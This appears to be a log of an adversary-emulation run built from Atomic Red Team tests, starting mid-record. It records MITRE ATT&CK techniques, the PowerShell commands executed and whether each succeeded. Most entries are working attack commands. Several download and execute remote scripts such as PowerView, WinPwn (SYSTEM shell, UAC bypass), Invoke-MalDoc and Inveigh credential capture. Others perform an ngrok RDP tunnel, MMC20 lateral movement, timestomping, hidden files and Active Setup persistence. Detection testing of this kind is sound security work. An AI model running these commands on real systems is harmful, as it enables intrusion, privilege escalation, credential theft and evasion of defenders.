 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose',
 'platform': 'windows',
 'run': '2023-11-28T14:24:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218__defense-evasion__signed_binary_proxy_execution__51ef5578afcd873709d2c7672234e57b__trial_1

atomic_ordering: ['51ef5578afcd873709d2c7672234e57b']
------------------------------
{'ability_id': '51ef5578afcd873709d2c7672234e57b',
 'agent_reported_time': '2023-11-11T13:08:50Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218',
            'technique_name': 'Signed Binary Proxy Execution'},
 'command': 'if (-not (Test-Path C:\\test)) {; New-Item -Path C:\\test '
            '-ItemType Directory; } else {; Write-Host "Directory C:\\test '
            'already exists." }; Copy-Item -Path '
            '"C:\\windows\\system32\\customshellhost.exe" -Destination '
            '"C:\\test\\customshellhost.exe" -Force; Copy-Item -Path '
            '"C:\\windows\\system32\\calc.exe" -Destination '
            '"C:\\test\\explorer.exe" -Force; C:\\test\\customshellhost.exe',
 'delegated': '2023-12-01T03:16:01Z',
 'description': 'This test simulates an adversary copying '
                '`customshellhost.exe` and `calc.exe` from '
                '`C:\\windows\\system32\\` to `C:\\temp\\`, renaming '
                '`calc.exe` to `explorer.exe`.\n'
                'Upon execution, customshellhost.exe will spawn calc.exe.\n'
                'Note this will only work on Windows 10 or 11.\n'
                '[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n'
                '[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n',
 'executor': 'psh',
 'link_id': '2b802bd8-1487-45f1-bb46-54372b98c6cc',
 'name': 'LOLBAS CustomShellHost to Spawn Process',
 'pid': 4724,
 'plaintext_command': 'if (-not (Test-Path C:\\test)) {; New-Item -Path '
                      'C:\\test -ItemType Directory; } else {; Write-Host '
                      '"Directory C:\\test already exists." }; Copy-Item -Path '
                      '"C:\\windows\\system32\\customshellhost.exe" '
                      '-Destination "C:\\test\\customshellhost.exe" -Force; '
                      'Copy-Item -Path "C:\\windows\\system32\\calc.exe" '
                      '-Destination "C:\\test\\explorer.exe" -Force; '
                      'C:\\test\\customshellhost.exe',
 'platform': 'windows',
 'run': '2023-12-01T03:16:11Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1071_004__command-and-control__application_layer_protocol-_dns__0fccd1bb314f0b3cbffd27c2123ae955__trial_1

atomic_ordering: ['0fccd1bb314f0b3cbffd27c2123ae955']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518__discovery__software_discovery__0954576f69ca8e140f2cdc9e58b36ff9__trial_1

atomic_ordering: ['0954576f69ca8e140f2cdc9e58b36ff9']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__79cb459770a15ea9e56b874d62bf8319__trial_1

atomic_ordering: ['79cb459770a15ea9e56b874d62bf8319']
------------------------------
{'ability_id': '79cb459770a15ea9e56b874d62bf8319',
 'agent_reported_time': '2023-11-11T13:10:35Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/logfile= /logtoconsole=false '
            '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
            "'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = "
            '$InstallerAssemblyDir;     OutputAssemblyFileName = '
            '$InstallerAssemblyFileName;     InvocationMethod = '
            "'Executable';     CommandLine = $CommandLine; }; $ActualOutput = "
            'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
            '-MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) '
            '{;     throw @"; InstallUtil class constructor execution test '
            'failure. Installer assembly execution output did not match the '
            'expected output.; Expected: $ExpectedOutput; Actual: '
            '$ActualOutput; "@; }',
 'delegated': '2023-11-30T20:50:42Z',
 'description': 'Executes the installer assembly class constructor. Upon '
                'execution, version information will be displayed the .NET '
                'framework install utility.\n',
 'executor': 'psh',
 'link_id': 'd7a6df00-2077-4201-a33d-4f04e93b2336',
 'name': 'InstallUtil class constructor method call',
 'pid': 708,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/logfile= '
                      '/logtoconsole=false `"$InstallerAssemblyFullPath`""; '
                      "$ExpectedOutput = 'Constructor_'; $TestArgs = @{;     "
                      'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
                      'OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
                      '-MinimumViableAssembly; if ($ActualOutput -ne '
                      '$ExpectedOutput) {;     throw @"; InstallUtil class '
                      'constructor execution test failure. Installer assembly '
                      'execution output did not match the expected output.; '
                      'Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T20:51:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1__trial_1

atomic_ordering: ['68ce066d07960123ccd981dd8c38a7c1']
------------------------------
{'ability_id': '68ce066d07960123ccd981dd8c38a7c1',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.006',
            'technique_name': 'Indicator Removal on Host: Timestomp'},
 'command': 'Get-ChildItem '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
            '| % { $_.LastAccessTime = "01/01/1970 00:00:00" }',
 'delegated': '2023-11-28T19:34:20Z',
 'description': 'Modifies the last access timestamp of a specified file. This '
                'technique was seen in use by the Stitch RAT.\n'
                'To verify execution, use File Explorer to view the Properties '
                'of the file and observe that the Accessed time is the year '
                '1970.\n',
 'executor': 'psh',
 'link_id': 'a7793f89-369f-4e31-9715-717ef2c93128',
 'name': 'Windows - Modify file last access timestamp with PowerShell',
 'pid': 10992,
 'plaintext_command': 'Get-ChildItem '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
                      '| % { $_.LastAccessTime = "01/01/1970 00:00:00" }',
 'platform': 'windows',
 'run': '2023-11-28T19:34:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1169b67e9f991716ba91833486f3c564__trial_1

atomic_ordering: ['1169b67e9f991716ba91833486f3c564']
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c6d6e157f9ff496abfed129dda16fe13__trial_1

atomic_ordering: ['c6d6e157f9ff496abfed129dda16fe13']
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__34dfc0264e6fd27b4997fea21c0bbada__trial_1

atomic_ordering: ['34dfc0264e6fd27b4997fea21c0bbada']
==============================
==============================
adversary_id: atomic__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4__trial_1

atomic_ordering: ['7ad5840a79f3259965fa28835dda93c4']
------------------------------
{'ability_id': '7ad5840a79f3259965fa28835dda93c4',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.014',
            'technique_name': 'Active Setup'},
 'command': 'Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Active '
            'Setup\\Installed '
            'Components\\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name '
            '"Version" -Value "0,0,0,0"; & '
            '$env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup',
 'delegated': '2023-12-02T08:57:14Z',
 'description': "This test will decrease the version number of the 'Internet "
                "Explorer Core Fonts' (UUID "
                '{C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the '
                'current user, \n'
                'which will force the StubPath payload (if set) to execute.\n',
 'executor': 'psh',
 'link_id': 'a13342c7-2b4c-403b-81c6-b3c46cdd2654',
 'name': "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by "
         'decreasing version number',
 'pid': 2456,
 'plaintext_command': 'Set-ItemProperty -Path '
                      '"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed '
                      'Components\\{C9E9A340-D1F1-11D0-821E-444553540600}" '
                      '-Name "Version" -Value "0,0,0,0"; & '
                      '$env:SYSTEMROOT\\system32\\runonce.exe '
                      '/AlternateShellStartup',
 'platform': 'windows',
 'run': '2023-12-02T08:57:18Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__1532b3faf25ad1e6f4fba4ada643b253__trial_1

atomic_ordering: ['1532b3faf25ad1e6f4fba4ada643b253']
------------------------------
{'ability_id': '1532b3faf25ad1e6f4fba4ada643b253',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1564.004',
            'technique_name': 'Hide Artifacts: NTFS File Attributes'},
 'command': 'echo "test" > $env:TEMP\\T1564.004_has_ads_powershell.txt | '
            'set-content -path test.txt -stream adstest.txt -value "test"; '
            'set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt '
            '-stream adstest.txt -value "test2"; set-content -path . -stream '
            'adstest.txt -value "test3"',
 'delegated': '2023-12-03T19:14:12Z',
 'description': 'Create an Alternate Data Stream with PowerShell. Write access '
                'is required. To verify execution, the the command "ls '
                '-Recurse | %{ gi $_.Fullname -stream *} | where stream -ne '
                '\':$Data\' | Select-Object pschildname"\n'
                'in the %temp% direcotry to view all files with hidden data '
                'streams. To view the data in the alternate data stream, run '
                '"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt" in '
                'the %temp% folder.\n',
 'executor': 'psh',
 'link_id': '861b40f0-cfd7-40b4-b3ac-0619e02aab49',
 'name': 'Create ADS PowerShell',
 'pid': 10176,
 'plaintext_command': 'echo "test" > '
                      '$env:TEMP\\T1564.004_has_ads_powershell.txt | '
                      'set-content -path test.txt -stream adstest.txt -value '
                      '"test"; set-content -path '
                      '$env:TEMP\\T1564.004_has_ads_powershell.txt -stream '
                      'adstest.txt -value "test2"; set-content -path . -stream '
                      'adstest.txt -value "test3"',
 'platform': 'windows',
 'run': '2023-12-03T19:14:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__98adc43648b0e4ea6e90a88ad5ae4b3d__trial_1

atomic_ordering: ['98adc43648b0e4ea6e90a88ad5ae4b3d']
------------------------------
{'ability_id': '98adc43648b0e4ea6e90a88ad5ae4b3d',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt" '
            '-officeProduct "Word" -sub "ExecChrome"',
 'delegated': '2023-11-30T15:19:03Z',
 'description': 'This module uses Google Chrome combined with ScriptControl to '
                'achieve code execution. It spawns a local\n'
                'webserver hosting our malicious payload. Headless Google '
                'Chrome will then reach out to this webserver\n'
                'and pull down the script and execute it. By default the '
                'payload will execute calc.exe on the system.\n',
 'executor': 'psh',
 'link_id': '7e46d60f-29ed-442f-904f-ab9ad35389c5',
 'name': 'Headless Chrome code execution via VBA',
 'pid': 6640,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt" '
                      '-officeProduct "Word" -sub "ExecChrome"',
 'platform': 'windows',
 'run': '2023-11-30T15:19:26Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1055_012__multiple__process_injection-_process_hollowing__557321faaf98c77b2b452cecd7b1de37__trial_1

atomic_ordering: ['557321faaf98c77b2b452cecd7b1de37']
------------------------------
{'ability_id': '557321faaf98c77b2b452cecd7b1de37',
 'agent_reported_time': '2023-11-11T13:10:15Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.012',
            'technique_name': 'Process Injection: Process Hollowing'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing) ; Invoke-MalDoc -macroFile '
            '"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt" '
            '-officeProduct "Word" -sub "Exploit"',
 'delegated': '2023-11-28T01:48:39Z',
 'description': 'This module executes notepad.exe from within the WINWORD.EXE '
                'process\n',
 'executor': 'psh',
 'link_id': 'c03cbf46-c2fa-4ce2-811d-0520a4c187f0',
 'name': 'RunPE via VBA',
 'pid': 2184,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing) ; Invoke-MalDoc -macroFile '
                      '"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt" '
                      '-officeProduct "Word" -sub "Exploit"',
 'platform': 'windows',
 'run': '2023-11-28T01:49:02Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1106__execution__native_api__b262964145fa55e27265e7caa89b1169__trial_1

atomic_ordering: ['b262964145fa55e27265e7caa89b1169']
------------------------------
{'ability_id': 'b262964145fa55e27265e7caa89b1169',
 'agent_reported_time': '2023-11-11T13:09:05Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1106',
            'technique_name': 'Native API'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
 'delegated': '2023-11-29T19:03:28Z',
 'description': 'Get SYSTEM shell - Pop System Shell using CreateProcess '
                'technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'd834436e-a573-4d92-afd3-3724bf6ffde5',
 'name': 'WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess '
         'technique',
 'pid': 7928,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
 'platform': 'windows',
 'run': '2023-11-29T19:03:34Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1557_001__multiple__adversary-in-the-middle-_llmnr,nbt-ns_poisoning_and_smb_relay__5ee8fce78c4cef28c4e6ecebe77bdba4__trial_1

atomic_ordering: ['5ee8fce78c4cef28c4e6ecebe77bdba4']
------------------------------
{'ability_id': '5ee8fce78c4cef28c4e6ecebe77bdba4',
 'agent_reported_time': '2023-11-11T13:09:41Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1557.001',
            'technique_name': 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning '
                              'and SMB Relay'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" '
            '-UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS '
            'Y -HTTPS Y -PROXY Y',
 'delegated': '2023-12-03T04:24:26Z',
 'description': 'Inveigh conducts spoofing attacks and hash/credential '
                'captures through both packet sniffing and protocol specific '
                'listeners/sockets. This Atomic will run continuously until '
                'you cancel it or it times out.',
 'executor': 'psh',
 'link_id': '319b73eb-7c8f-4eb1-9467-d3538840cae0',
 'name': 'LLMNR Poisoning with Inveigh (PowerShell)',
 'pid': 4264,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" '
                      '-UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y '
                      '-NBNS Y -MDNS Y -HTTPS Y -PROXY Y',
 'platform': 'windows',
 'run': '2023-12-03T04:25:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1021_003__lateral-movement__remote_services-_distributed_component_object_model__68df771632fd6216858edd20458ee5bb__trial_1

atomic_ordering: ['68df771632fd6216858edd20458ee5bb']
------------------------------
{'ability_id': '68df771632fd6216858edd20458ee5bb',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.003',
            'technique_name': 'Remote Services: Distributed Component Object '
                              'Model'},
 'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
            '$null, $null, "7")',
 'delegated': '2023-11-27T10:00:30Z',
 'description': 'Powershell lateral movement using the mmc20 application com '
                'object.\n'
                '\n'
                'Reference:\n'
                '\n'
                'https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n'
                '\n'
                'Upon successful execution, cmd will spawn calc.exe on a '
                'remote computer.\n',
 'executor': 'psh',
 'link_id': '62fe47ec-98e5-497f-a4fd-a4c331d7fa21',
 'name': 'PowerShell Lateral Movement using MMC20',
 'pid': 6340,
 'plaintext_command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
                      '$null, $null, "7")',
 'platform': 'windows',
 'run': '2023-11-27T10:01:04Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__824ec334619ca634d13aff308a9a064c__trial_1

atomic_ordering: ['824ec334619ca634d13aff308a9a064c']
------------------------------
{'ability_id': '824ec334619ca634d13aff308a9a064c',
 'agent_reported_time': '2023-11-11T13:09:41Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'UACBypass -noninteractive -command '
            '"C:\\windows\\system32\\cmd.exe" -technique magic',
 'delegated': '2023-12-02T11:13:13Z',
 'description': 'UAC bypass using Magic technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '679c6a36-2da8-4720-8441-ee6f8e43c820',
 'name': 'WinPwn - UAC Magic',
 'pid': 5244,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'UACBypass -noninteractive -command '
                      '"C:\\windows\\system32\\cmd.exe" -technique magic',
 'platform': 'windows',
 'run': '2023-12-02T11:13:21Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218__defense-evasion__signed_binary_proxy_execution__085858a8aa5ea8e6a810e59c75ea7f6a__trial_1

atomic_ordering: ['085858a8aa5ea8e6a810e59c75ea7f6a']
------------------------------
{'ability_id': '085858a8aa5ea8e6a810e59c75ea7f6a',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218',
            'technique_name': 'Signed Binary Proxy Execution'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo '
            '-ModulePath $PWD',
 'delegated': '2023-12-01T02:38:05Z',
 'description': 'RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell '
                'host executable that was introduced in Windows 10 and Server '
                '2019 (OS Build 17763.1339).\n'
                '\n'
                'One of the PowerShell functions called by '
                'RemoteFXvGPUDisablement.exe is '
                'Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V '
                'module. This atomic test influences '
                'RemoteFXvGPUDisablement.exe to execute custom PowerShell code '
                'by using a technique referred to as "PowerShell module '
                'load-order hijacking" where a module containing, in this '
                'case, an implementation of the '
                'Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of '
                'introducing a temporary module into the first directory '
                'listed in the %PSModulePath% environment variable or within a '
                'user-specified module directory outside of %PSModulePath%. '
                'Upon execution the temporary module is deleted.\n'
                '\n'
                'Invoke-ATHRemoteFXvGPUDisablementCommand is used in this test '
                'to demonstrate how a PowerShell host executable can be '
                'directed to user-supplied PowerShell code without needing to '
                'supply anything at the command-line. PowerShell code '
                'execution is triggered when supplying the "Disable" argument '
                'to RemoteFXvGPUDisablement.exe.\n'
                '\n'
                'The Invoke-ATHRemoteFXvGPUDisablementCommand function outputs '
                'all relevant execution-related artifacts.\n'
                '\n'
                'Reference: '
                'https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n',
 'executor': 'psh',
 'link_id': 'f23a660f-7dc3-4286-8541-3ab1c2974c51',
 'name': 'Invoke-ATHRemoteFXvGPUDisablementCommand base test',
 'pid': 9648,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName '
                      'foo -ModulePath $PWD',
 'platform': 'windows',
 'run': '2023-12-01T02:39:13Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__fd4ca8f12c6d3a9af55be0211878509b__trial_1

atomic_ordering: ['fd4ca8f12c6d3a9af55be0211878509b']
------------------------------
{'ability_id': 'fd4ca8f12c6d3a9af55be0211878509b',
 'agent_reported_time': '2023-11-11T13:08:58Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': '$file = New-Item '
            '$env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; '
            "$file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host "
            '"File created: $($file.FullName)"',
 'delegated': '2023-11-27T13:32:57Z',
 'description': 'The following Atomic Test will create a file with a specific '
                'name and sets its attributes to Hidden, System, and Archive. '
                'This was related to the Snake Malware campaign and is later '
                "decrypted by Snake's kernel driver.\n"
                '[Snake Malware - '
                'CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n',
 'executor': 'psh',
 'link_id': '6777f7d6-ea2c-4ec5-8479-6d368ba9d607',
 'name': 'Snake Malware Encrypted crmlog file',
 'pid': 4768,
 'plaintext_command': '$file = New-Item '
                      '$env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; '
                      "$file.Attributes = 'Hidden', 'System', 'Archive'; "
                      'Write-Host "File created: $($file.FullName)"',
 'platform': 'windows',
 'run': '2023-11-27T13:33:10Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1482__discovery__domain_trust_discovery__ff659febed01ef020792aa5f83d08d6d__trial_1

atomic_ordering: ['ff659febed01ef020792aa5f83d08d6d']
------------------------------
{'ability_id': 'ff659febed01ef020792aa5f83d08d6d',
 'agent_reported_time': '2023-11-11T13:10:36Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1482',
            'technique_name': 'Domain Trust Discovery'},
 'command': 'Import-Module '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"; '
            'Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; '
            'Get-ADGroupMember Administrators -Recursive; '
            '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()',
 'delegated': '2023-12-01T08:27:41Z',
 'description': 'Use powershell to enumerate AD information.\n'
                'Requires the installation of PowerShell AD admin cmdlets via '
                'Windows RSAT or the Windows Server AD DS role.\n',
 'executor': 'psh',
 'link_id': '11129d9c-22bc-4ec4-af8b-39050f160b5f',
 'name': 'Powershell enumerate domains and forests',
 'pid': 10248,
 'plaintext_command': 'Import-Module '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"; '
                      'Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; '
                      'Get-ADGroupMember Administrators -Recursive; '
                      '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()',
 'platform': 'windows',
 'run': '2023-12-01T08:28:42Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1572__command-and-control__protocol_tunneling__f49909057fa568660a6f268b7261e446__trial_1

atomic_ordering: ['f49909057fa568660a6f268b7261e446']
------------------------------
{'ability_id': 'f49909057fa568660a6f268b7261e446',
 'agent_reported_time': '2023-11-11T13:09:09Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1572',
            'technique_name': 'Protocol Tunneling'},
 'command': 'C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | '
            'Out-Null; Start-Job -ScriptBlock { '
            'C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null; '
            'Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null',
 'delegated': '2023-12-04T00:44:43Z',
 'description': 'Download and run ngrok. Create tunnel to chosen port.\n',
 'executor': 'psh',
 'link_id': '65d185e9-34a6-43f3-9169-01e6675759d4',
 'name': 'run ngrok',
 'pid': 3568,
 'plaintext_command': 'C:\\Users\\Public\\ngrok\\ngrok.exe config '
                      'add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { '
                      'C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | '
                      'Out-Null; Start-Sleep -s 5 ; Stop-Job -Name Job1 | '
                      'Out-Null',
 'platform': 'windows',
 'run': '2023-12-04T00:45:07Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
